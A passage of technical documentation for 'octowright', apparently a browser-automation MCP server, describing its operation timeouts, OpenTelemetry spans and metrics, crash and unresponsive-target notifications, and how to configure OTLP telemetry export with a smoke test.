  timeout is turned into an `unresponsive` `SessionCrashedEvent`
  (`octowright_unresponsive_target_total`), and **Browser Session Operation
  Gate** above for `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`, the
  separate, off-by-default backstop for a call site this budget doesn't yet
  cover. Parser/primitive: `session.timeouts.unbounded_call_timeout_seconds`
  / `bounded`.
- `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` — FIFO admission timeout for the
  per-session **Browser Session Operation Gate** (see above). **Default `300`**;
  must parse as positive, finite seconds or the pool/gate fails to configure.
  `BrowserPool(operation_queue_timeout_seconds=...)` takes precedence over the
  env var, which takes precedence over the default. Bounds only the queue wait
  before an operation is admitted — a separate concern from any Playwright
  action/navigation/expect timeout, and no automatic retries are added.
  Close coordinators and crash recovery are durable system operations and do
  not use this timeout. Parser/resolver:
  `session.operation.gate.resolve_operation_queue_timeout_seconds`.
- `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS` — opt-in active-duration
  ceiling on a session's operation gate; see **Browser Session Operation
  Gate** above. **OFF by default** (unset or a falsey token —
  `0`/`off`/`never`/`none`/`disabled`/`false`/`no`/empty — disables it),
  unlike the queue-admission timeout above: cancelling in-flight browser
  work is a heavier intervention than failing one call, and this is a
  backstop for call sites nobody has bounded yet, not the primary fix.
  An unparsable value falls back to **OFF**, not to a default budget — the
  opposite of `OCTOWRIGHT_UNBOUNDED_CALL_TIMEOUT_SECONDS`'s fallback, and
  deliberately so: that guard is ON by default and a typo must not silently
  reintroduce the hang, while this one is OFF by default and a typo must
  not silently turn it on. Checked from the periodic housekeeping loop
  (job 6), not a per-gate background task — one timer per session across a
  large pool is real overhead for a rare event. Parser/resolver:
  `session.operation.gate.resolve_operation_active_timeout_seconds`; job:
  `housekeeping._enforce_operation_active_timeout_once`.
- `OCTOWRIGHT_DASHBOARD_OPERATION_TIMEOUT_SECONDS` — separate, much shorter gate
  wait budget for best-effort **dashboard reads** (session-detail aria capture,
  live screenshot, selector validate) that touch a session's operation gate.
  **Default `8.0`** seconds; a non-positive/unparsable value falls back to the
  default rather than going unbounded. An MCP tool call still inherits the
  gate's own `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (300s default) because
  an agent is willing to wait out a real in-flight action, whereas a human
  staring at the dashboard needs a fast, legible failure instead of an
  unexplained multi-minute stall. Parser: `http/routes/_common._dashboard_operation_timeout_seconds`.

## Telemetry (OpenTelemetry)

Tracing and metrics are emitted via `provide.telemetry`. Logs are always structured; spans and metrics are emitted ONLY when explicitly enabled — the noop tracer/meter is the default so there's no cost when not in use. Exports use OTLP, so any OTel-compatible backend works: an OTel Collector that fans out to LGTM/Tempo, OpenObserve, Honeycomb, Datadog (OTLP), Jaeger, Grafana Cloud, SigNoz, etc. The codebase does not name a specific backend.

### Spans

Span names follow the `octowright.<area>.<verb>` convention. The list below is alphabetized for stability — order has no semantic meaning. Per-span attributes vary; only the attributes actually set at the span call site are listed (callers may add more via `set_attrs` mid-span).

| Span | Attributes | Emitted by |
|------|------------|------------|
| `octowright.artifact.verify` | `artifact_type`, `name`, `critical_points`, `run_id` | `artifacts/verification.py` |
| `octowright.artifact.verify.check` | `artifact_type`, `check_type` | `artifacts/verification.py` |
| `octowright.bridge.forward_rpc` | `method`, `request_id` | `proxy_supervisor.forward_rpc` (follower leg) |
| `octowright.browser.handoff` | `old_instance_id`, `kind`, `headed`, `close_original`, `accept_stateless` | `browser_pool/lifecycle.handoff_browser` |
| `octowright.browser.launch` | `kind` | `browser_pool/_metrics.launch_span` (wraps `pool.launch`) |
| `octowright.browser.relaunch_fluid` | `instance_id`, `kind` | `browser_pool/pool.relaunch_fluid` |
| `octowright.browser.spawn_roster` | `roster_size` | `browser_pool/roster.browser_spawn_roster` |
| `octowright.macro.action` | `action`, `instance_id` | `macros/runtime.dispatch_simple` |
| `octowright.macro.artifact.run` | `macro`, `run_id`, `verify` | `macros/artifacts.py` |
| `octowright.macro.run` | `macro`, `instance_id`, `kind` | `macros/execution.run_macro` |
| `octowright.macro.run_sequence` | `names_count`, `stop_on_failure` | `macros/execution.run_sequence` |
| `octowright.mcp.request` | `method`, `path` | `_trace_propagation.TraceContextExtractionMiddleware` (leader leg, ends on `http.response.start`) |
| `octowright.scenario.run_macro` | `scenario_id`, `macro`, `role`, `targeted` | `scenarios_pool.ScenarioPool.run_macro` |
| `octowright.scenario.start` | `scenario_id`, `scenario_name`, `participants` | `scenarios_pool.ScenarioPool.start` |
| `octowright.session.close` | `instance_id`, `kind` | `session/core_ops_mixin.SessionOpsMixin.close` |
| `octowright.session.navigate` | `instance_id`, `kind`, `url` | `session/core_page_mixin.SessionPageMixin.navigate` |

The terminal session-kind plugin (`packages/octowright-terminal`, see **Terminal Sessions (plugin)**) emits its own `octowright.terminal.launch` / `.close` / `.send_input` spans, documented in its own README rather than here, since core does not emit them.

`macro.action` spans nest under their `macro.run` parent, which (when invoked from `macro_run_sequence`) nests under `macro.run_sequence`, so a multi-step macro run renders as a clean tree.

The `url` attribute on `octowright.session.navigate` is run through `_sanitize_url_for_span` before it is stamped: it strips the query string *and* any `user:pass@` basic-auth userinfo (preserving `host:port` verbatim by dropping everything up to the last `@` in the netloc), so navigation tokens and cleartext credentials don't reach traces / exporter backends. The full URL still flows to `self.url` and the recorder's `navigate` event — only the span attribute is sanitized.

### Trace context propagation across the bridge

The follower→leader chain is glued together by the W3C `traceparent` header. On the follower side, `proxy_supervisor.forward_rpc` opens its `octowright.bridge.forward_rpc` span and hands the underlying MCP `streamable_http_client` a ready-made `httpx2.AsyncClient` from `_trace_propagation.build_tracing_http_client` — MCP 2.0 takes the client itself, where 1.x took an `httpx_client_factory`. That client carries a per-request hook (`_inject_traceparent_hook`) that calls the OTel propagator to inject `traceparent` (and `tracestate`) into every outgoing HTTP request, and a response hook capturing `mcp-session-id` — 2.0 no longer yields a `get_session_id` callable alongside the streams, and the leader's pid-liveness reaper matches sessions by `(follower_pid, remote_session_id)`, so losing it would silently disable that reaper. On the leader side, `_trace_propagation.TraceContextExtractionMiddleware` runs as ASGI middleware in front of the HTTP-MCP app: it extracts the propagated context from request headers, attaches it via `opentelemetry.context.attach`, then opens the per-request `octowright.mcp.request` span. Any spans started while the leader handles the request — including spans inside `@mcp.tool` handlers like `browser.launch` or `macro.run` — chain under the follower's `bridge.forward_rpc` span. The `mcp.request` span ends as soon as `http.response.start` is sent (not on body completion) to avoid filling the OTel batch-exporter buffer with long-lived SSE streams.

### Metrics

| Instrument | Type | Labels | Description |
|------------|------|--------|-------------|
| `octowright_browser_launched_total` | counter | `kind` | Browsers launched (recorded after registration). |
| `octowright_browser_closed_total` | counter | `kind` | Browser sessions closed cleanly via `session.close()`. |
| `octowright_browser_launch_failed_total` | counter | `kind`, `error` | Failed launches. `error` is the exception class name. |
| `octowright_browser_evicted_total` | counter | `kind` | Browsers removed from the pool by an external close signal (not `pool.close`). |
| `octowright_macro_run_total` | counter | `macro`, `status` | Macro runs (`status` is `ok`/`failed`). |
| `octowright_bridge_reconnect_total` | counter | `reason` | Times the follower bridge reconnected to the leader. |
| `octowright_bridge_rpc_total` | counter | `method` | JSON-RPC messages forwarded local→remote. |
| `octowright_bridge_resume_total` | counter | — | In-flight requests re-sent to the leader after a reconnect (idempotent resume). |
| `octowright_bridge_suspension_total` | counter | — | Follower-process suspensions detected by the deadline watchdog (a client froze the follower, e.g. an MCP-client compaction SIGSTOP). |
| `octowright_browser_crashed_total` | counter | `kind` | Renderer crashes observed (`page.on("crash")`). |
| `octowright_browser_crash_recovered_total` | counter | `kind` | Renderer crashes auto-recovered by replacing the dead page. |
| `octowright_browser_crash_recovery_failed_total` | counter | `kind` | Auto-recovery attempts whose page replacement failed. |
| `octowright_unresponsive_target_total` | counter | `kind` | Targets that stopped answering a Playwright call within its budget (`SessionCallTimeoutError`, `CrashScope="unresponsive"`) — not a `page.on("crash")` event, so kept separate from `octowright_browser_crashed_total`. |
| `octowright_driver_restart_total` | counter | — | Shared Playwright driver deaths rebuilt mid-run (the SPOF signal). |
| `octowright_driver_lost_total` | counter | `outcome`, `kind` | Sessions lost when the shared driver died (`outcome` = `surfaced`/`relaunched`). |
| `octowright_launch_refused_total` | counter | `reason` | User-facing launches refused (`reason` = `cap`/`memory`). |
| `octowright_orphan_reaped_total` | counter | `scope` | Orphaned (dead-driver) browser processes killed by the reaper. |
| `octowright_follower_session_reaped_total` | counter | — | Leader MCP sessions terminated by the housekeeping pid-liveness reaper (job 3) because their follower's OS process was found dead. Process-lifetime running total also readable in-process via `octowright_status()["bridge"]["follower_sessions_reaped"]`. |
| `octowright_mcp_new_session_throttled_total` | counter | — | Session-creating `/mcp` requests rejected with `429` by the leader-side per-source new-session rate limit (`OCTOWRIGHT_MCP_NEW_SESSION_MAX`). A high value means a follower is storming — reconnecting/creating sessions far faster than legit use. |
| `octowright_mcp_session_evicted_total` | counter | — | Leader MCP sessions evicted by housekeeping because the live table exceeded `OCTOWRIGHT_MCP_MAX_SESSIONS` (the version-agnostic memory bound against a session storm). |
| `octowright_bridge_leader_recovery_total` | counter | `outcome` | Leader-down gaps (`outcome` = `recovered`/`exhausted`) — how often a leader restart is survived vs. drops the client. |
| `octowright_artifact_verify_total` | counter | — | Macro-artifact verification runs. |
| `octowright_artifact_verify_check_total` | counter | — | Per-check results within a macro-artifact verification. |
| `octowright_macro_artifact_run_total` | counter | — | Macro-artifact replay runs. |
| `octowright_process_rss_bytes` | histogram (By) | `scope` | Resident memory of the leader + its browsers, sampled each housekeeping cycle (`scope` = `leader`/`browsers`/`total`) — the continuous multi-day leak signal. |
| `octowright_browser_launch_duration_seconds` | histogram (s) | `kind` | Time from `pool.launch()` entry to registered session. |
| `octowright_macro_run_duration_seconds` | histogram (s) | `macro` | `run_macro` elapsed time including nested actions. |
| `octowright_session_navigate_duration_seconds` | histogram (s) | `kind` | Duration of `session.navigate()` including `page.goto`. |
| `octowright_bridge_rpc_duration_seconds` | histogram (s) | `method`, `outcome` | End-to-end follower→leader→follower RPC latency. |
| `octowright_operation_queue_wait_seconds` | histogram (s) | `operation`, `kind`, `outcome` | Time an operation spent in the per-session FIFO queue before admission (`outcome` = `admitted`/`timeout`/`cancelled`). See **Browser Session Operation Gate**. |
| `octowright_operation_active_duration_seconds` | histogram (s) | `operation`, `kind`, `outcome` | Time an admitted operation held the gate (`outcome` = `ok`/`error`/`cancelled`). |
| `octowright_operation_queue_timeout_total` | counter | `operation`, `kind` | FIFO tickets that expired before admission (`SessionBusyTimeoutError`). |
| `octowright_operation_active_timeout_total` | counter | `operation`, `kind` | Active-duration ceiling breaches (`OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS`, off by default) — a session's root operation ran longer than the ceiling, so its owning task was cancelled and the gate driven to `broken`. Incremented once per breach; a gate already `broken` short-circuits before re-incrementing. |
| `octowright_operation_rejected_total` | counter | `operation`, `kind`, `reason` | Operations rejected outright because the gate was not open (`reason` is the gate state or close/invariant cause, e.g. `closing`/`closed`/`broken`/`external_close`/`session_closed`). |
| `octowright_operation_queue_depth` | gauge (1) | `kind` | Current FIFO queue depth, aggregated per browser `kind` (not per session or per operation). |

The `macro` label is capped at `OCTOWRIGHT_METRICS_MACRO_LABEL_CAP` distinct values (default 256); beyond the cap, names land in an `(overflow)` bucket so long-lived deployments don't unbound their time-series count. The `error` and `method` labels are intrinsically bounded by code paths; `kind` is bounded to the three browser engines plus `unknown`. `octowright_status()["metrics"]` surfaces `macro_labels_seen` and `macro_label_overflow_count` so an operator can see when dynamic macro names (e.g. `migrate-table-{uuid}`) have saturated the cap. The recovery escape hatch is `octowright.macros.execution.reset_macro_label_seen()` — in-process only (not exposed as an MCP tool, by design) for tests or operator process access.

There is intentionally no counter for the ws-cache batched flush — the flush is purely a transport optimization and its frequency is not a useful operational signal.

### MCP notifications (proactive, LLM-facing)

Octowright builds JSON-RPC notifications for exceptional situations from `browser_pool` session-event-bus events (`server/mcp_notifications.notification_payload` / `_build_notification`) and delivers them over TWO paths so a client gets them regardless of transport: (1) **stdio** — the emitter (`run_with_notifications`) writes to the stdio server, used when the leader runs inline (`--no-singleton`); (2) **follower bridge** — the leader streams the event bus over the `GET /api/mcp-events` SSE endpoint (`http/routes/mcp_events.py`), and the follower's `proxy_runtime.consume_leader_notifications` re-injects each frame (rebuilt via `payload_to_message`) into the local stdio client write. Path (2) closes the daemon-mode gap: the HTTP-MCP transport the detached-daemon leader serves has no server-initiated-notification path of its own, so without it a stdio-client-through-follower (the normal deployment) would never see crash/driver/close notifications. The leader's own stdio emitter writes to the detached daemon's clientless stdout, so there is no double-delivery. A **direct** HTTP-MCP client that bypasses the follower still gets no push (SDK limitation) — so the LLM should still treat `octowright_status()` (health / crash.recent / pool.lost_sessions) as the authoritative check and notifications as best-effort. Covered end-to-end by `tests/test_mcp_events_daemon_live.py` (via-follower delivery) and `tests/test_mcp_notifications_daemon_live.py` (direct-client boundary).

| Method | Fires when | Key params |
|--------|-----------|------------|
| `notifications/octowright/browser_crashed` | a renderer crash is observed (`page.on("crash")`), OR a target stops answering within its call budget (`scope="unresponsive"`) | `recovering` (auto-recovery scheduled → WAIT for `browser_recovered`, don't relaunch; always `false` for `scope="unresponsive"`), `scope` (`renderer`/`process`/`unresponsive`), `hint` |
| `notifications/octowright/browser_recovered` | a renderer-crash recovery resolved | `outcome` (`recovered` = usable again, continue / `failed` / `exhausted` = relaunch), `attempts`, `hint` |
| `notifications/octowright/driver_died` | the shared driver died and sessions were lost | `lost_instance_ids`, `relaunch_mode`, `restart_count`, `hint` (points at `octowright_status().pool.lost_sessions`) |
| `notifications/octowright/session_closed` | a session left the pool | `reason` (`agent_close`/`user_close`/`external_disconnect`/`crashed`/`shutdown`) |

A third `CrashScope` (`browser_pool/events.py`) exists alongside `renderer`/`process`: `unresponsive`, for a target that is alive but stopped answering a Playwright call within its budget (`session/timeouts.py`'s `bounded()`, raising `SessionCallTimeoutError` — the 2026-08-29 incident this closes, where a wedged WebKit target hung a test run for 12.6 hours with `page.on("crash")` never firing because a merely-unresponsive target never crashes). No Playwright event reports this case, so it is *raised* by the call budget rather than *observed* like a real crash.

**The rule** (`SessionOperationGate.operation()`, `session/operation/gate/core.py`): the INNERMOST gated operation that sees a `SessionCallTimeoutError` escape it — reachable via the exception's explicit `__cause__` chain (`_call_timeout_cause`, bounded to a few hops against a pathological chain), not just the top-level type — publishes exactly once, and marks that `SessionCallTimeoutError` instance (`_mark_call_timeout_published`) so any ancestor frame the exception continues propagating through (still escaping, or reachable via its own `__cause__` walk) finds the mark and stays silent. That holds regardless of what an outer caller does with the exception afterward — re-raise it, wrap it again, or swallow it inside its own lease — because the publish already happened at the point of first escape, before the outer caller ever got a chance to touch it. This is deliberately NOT "the root lease publishes": an earlier version of this fix gated on `_LeaseToken.is_root` (root-only), reasoned from call-graph shape that every caller "goes through `run_macro`/`run_sequence`" and would therefore see it — which review round 3 proved false by driving `macros/artifacts.py`'s `run_macro_artifact` and `run_sequence(stop_on_failure=False)`: both catch the wrapped timeout inside their OWN root lease and never re-raise it, so nothing ever escaped a root frame for a root-only check to see, and neither published anything. The innermost-lease rule needs no per-caller enumeration and no update when a new caller is added, because it does not depend on knowing what any particular caller does with the exception. `BrowserSession.__post_init__` wires the gate's `on_call_timeout` hook to `BrowserSession._notify_call_timeout`, which publishes `SessionCrashedEvent(scope="unresponsive", recovering=False)` and counts `octowright_unresponsive_target_total{kind}`, using THIS frame's own operation name — for a nested wedge, the specific action that stalled, not an outer umbrella name.

**Deliberately does not auto-recover**: renderer-crash recovery replaces the dead page, which is right for an actual crash and wrong here — the target may still be executing, and force-replacing it can thrash a browser that is only slow. Surface + notify; let the caller (agent or operator) decide whether to wait, retry, or relaunch with `browser_launch`. The counter and the notification are not enough on their own to keep this scope visible on the PULL surface in the common configuration: a push notification is best-effort (a direct HTTP-MCP client gets no push at all — SDK limitation), and an OTel counter is a noop unless `PROVIDE_METRICS_ENABLED` is set (off by default). So `_notify_call_timeout` also records an `incidents.CATEGORY_UNRESPONSIVE_TARGET` incident (`instance_id`, `kind`, `url`, `operation` — the gated operation name that timed out — and a timestamp; deliberately no exception message, since the operation name is the diagnostic signal and a message could carry a URL/path), surfaced at `octowright_status()["crash"]["unresponsive_recent"]`. That is a key SEPARATE from `"recent"` (the renderer-crash records), not folded into it: `"recent"` runs through `crash_reports.enrich`, which correlates macOS `.ips` SIGSEGV signatures written a beat after a real crash, and an unresponsive target never crashed — it just stopped replying — so it has no crash report to correlate and folding the two would invite a lookup that can never hit.

**A lookup that fails after an unresponsive target says so.** The hook above deliberately neither sets `_crashed` nor tears the session down, so an unresponsive target usually stays live and the next call simply works. But when that browser is *later* evicted for any reason (an external close, a dead driver), `lifecycle._record_recently_evicted` used to store a crashed/not-crashed **bool** — and since the unresponsive path never sets `_crashed`, the lookup fell into the generic `ended unexpectedly (closed or crashed externally) — relaunch it with browser_launch` branch. That is the wrong advice in this exact case: the browser process is usually still running, so relaunching discards a live session and its profile state to fix something that only needed a smaller batch, and it says nothing about downloads the timed-out call may already have landed. The ledger is now three states (`crashed` / `unresponsive` / `external`), read from a `_unresponsive_operation` marker the hook sets, and `pool._missing_session_message` has a third branch naming the recovery path (`browser_list` before relaunching, `browser_downloads`, retry smaller) instead of `browser_launch`. A crash **wins** over unresponsiveness when both are set: a target that went quiet and then actually died is a crash, and `relaunch` is right for it. The marker deliberately lives on the session rather than being read back out of `incidents` — that ring is 25 entries **shared across all categories**, and its own docstring notes a repeatedly-unresponsive target evicts its own history, which is fine for the `octowright_status` surface it was built for and unreliable as a correctness input. The `SessionCallTimeoutError` raised while the session is still live already carried the right advice and keeps it, now also naming the smaller-batch retry and the `browser_downloads` check.

The MCP server `instructions` string (`server/_state.py`) summarizes this taxonomy so the LLM knows the signals exist; refused launches surface in-band as actionable tool errors (cap / memory floor), not notifications.

### Session log context

Spans are the canonical way to attach session identity to telemetry: span attributes (`instance_id`, `kind`, etc.) are recorded on the span object itself and travel with it regardless of which asyncio task started the span. Anything that needs to chain across tool calls — traces, metrics with `kind=` labels, propagated context across the bridge — relies on the span path, not on log context.

For structured logs, every tool-handler log call passes `instance_id=` explicitly as a keyword (`log.info("session.navigate", instance_id=..., url=...)` style). There is no global contextvar binding that fills it in for you; if a new log site wants the per-session identifiers, it must pass them as kwargs.

### Enabling export

Two env vars turn things on; the OTLP endpoint vars are the standard OpenTelemetry ones (`OTEL_EXPORTER_OTLP_*`), so any backend that speaks OTLP is wired the same way:

```bash
# Required: turn on tracing + metrics. Both default off.
export PROVIDE_TRACE_ENABLED=true
export PROVIDE_METRICS_ENABLED=true

# Optional — service name defaults to "octowright".
# export PROVIDE_TELEMETRY_SERVICE_NAME=octowright-dev

# Point at your backend. Either set the per-signal vars explicitly:
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=https://<host>/v1/traces
export OTEL_EXPORTER_OTLP_METRICS_ENDPOINT=https://<host>/v1/metrics
export OTEL_EXPORTER_OTLP_LOGS_ENDPOINT=https://<host>/v1/logs
# …or set one root and let the SDK append /v1/<signal>:
# export OTEL_EXPORTER_OTLP_ENDPOINT=https://<host>

# Auth (if your backend requires it):
# export OTEL_EXPORTER_OTLP_HEADERS="Authorization=Basic <base64-user:pass>"
# or, vendor-specific:
# export OTEL_EXPORTER_OTLP_HEADERS="api-key=<token>"

uv run octowright serve
```

The OTel SDK is pulled in as an extra (`provide-telemetry[otel]`); without it (or without `PROVIDE_TRACE_ENABLED=true`), the tracer/meter are noops and the cost is one cached attribute lookup per span entry — safe to leave the instrumentation in place.

#### Backend-specific notes

**Local OTel Collector (gRPC 4317 / HTTP 4318)** — most LGTM stacks (Loki + Grafana + Tempo + Mimir/Prometheus + Pyroscope) and any "agent-in-the-middle" deployment land here. The collector fans out to whatever backends it's configured with; from octowright's perspective it's the only URL you care about:

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318
export OTEL_EXPORTER_OTLP_PROTOCOL=http/protobuf
```

**OpenObserve (direct ingestion)** — exposes per-stream paths under `/api/<org>/v1/<signal>`:

```bash
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://localhost:5080/api/default/v1/traces
export OTEL_EXPORTER_OTLP_METRICS_ENDPOINT=http://localhost:5080/api/default/v1/metrics
export OTEL_EXPORTER_OTLP_LOGS_ENDPOINT=http://localhost:5080/api/default/v1/logs
```

**Honeycomb / Grafana Cloud / SigNoz / similar SaaS** — same `OTEL_EXPORTER_OTLP_*` vars; auth goes in `OTEL_EXPORTER_OTLP_HEADERS`.

#### Smoke-test recipe

End-to-end verification (replace the URL with your backend):

```bash
PROVIDE_TRACE_ENABLED=true PROVIDE_METRICS_ENABLED=true \
PROVIDE_TELEMETRY_SERVICE_NAME=octowright-smoketest \
OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4318 \
OTEL_EXPORTER_OTLP_PROTOCOL=http/protobuf \
uv run --active python -c "
from provide.telemetry import setup_telemetry, shutdown_telemetry
from octowright._tracing import span, counter
setup_telemetry()
with span('octowright.browser.launch', kind='chromium'):
    with span('octowright.macro.run', macro='login'):
        pass
counter('octowright_smoketest_total').add(1, attributes={'kind': 'chromium'})
shutdown_telemetry()
print('emitted')
"
```

Then query your backend for `service.name=octowright-smoketest`. The expected span tree is `browser.launch → macro.run`. The counter shows up as `octowright_smoketest_total{service_name="octowright-smoketest", kind="chromium"} = 1`.
